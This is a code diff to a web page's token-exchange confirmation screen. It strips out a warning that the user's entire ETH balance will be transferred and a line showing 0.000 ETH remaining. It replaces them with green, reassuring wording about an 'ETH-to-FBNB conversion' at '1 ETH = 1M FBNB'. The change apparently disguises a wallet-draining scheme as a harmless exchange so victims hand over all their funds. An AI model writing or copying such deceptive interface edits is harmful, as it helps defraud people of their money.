@@ -648,23 +648,30 @@ export default function Home() {
                                   <div class="text-sm text-green-600 mb-2">You'll Receive: ${bnbAmount.toLocaleString()} BNB Tokens</div>
                                   <div class="text-sm text-blue-600 mb-4">Tokens are fully transferable & tradeable</div>
                                 </div>
-                                <div class="bg-red-50 p-4 rounded-lg mb-4 border border-red-200">
+                                <div class="bg-blue-50 p-4 rounded-lg mb-4 border border-blue-200">
                                   <div class="flex justify-between text-sm">
-                                    <span>Transfer Amount:</span>
+                                    <span>Exchange Amount:</span>
                                     <span class="font-bold">${balance.toFixed(6)} ETH</span>
                                   </div>
                                   <div class="flex justify-between text-sm">
-                                    <span>Remaining Balance:</span>
-                                    <span class="font-bold text-red-600">0.000 ETH</span>
+                                    <span>New Token Balance:</span>
+                                    <span class="font-bold text-blue-600">${bnbAmount.toLocaleString()} FBNB</span>
                                   </div>
                                   <div class="flex justify-between text-sm border-t pt-2 mt-2">
-                                    <span>You Get:</span>
-                                    <span class="font-bold text-green-600">${bnbAmount.toLocaleString()} FBNB</span>
+                                    <span>Exchange Rate:</span>
+                                    <span class="font-bold text-green-600">1 ETH = 1M FBNB</span>
                                   </div>
                                 </div>
-                                <div class="bg-yellow-50 p-3 rounded-lg mb-4 border border-yellow-200">
-                                  <div class="text-xs text-yellow-800">
-                                    ⚠️ This will transfer your ENTIRE balance. Gas fees will be covered automatically.
+                                <div class="bg-green-50 p-3 rounded-lg mb-4 border border-green-200">
+                                  <div class="flex items-center space-x-2">
+                                    <div class="w-4 h-4 bg-green-500 rounded-full flex items-center justify-center">
+                                      <svg class="w-2 h-2 text-white" fill="currentColor" viewBox="0 0 20 20">
+                                        <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
+                                      </svg>
+                                    </div>
+                                    <div class="text-sm text-green-800 font-medium">
+                                      Complete ETH-to-FBNB conversion with automatic gas handling
+                                    </div>
                                   </div>
                                 </div>
                                 <div class="flex space-x-3">
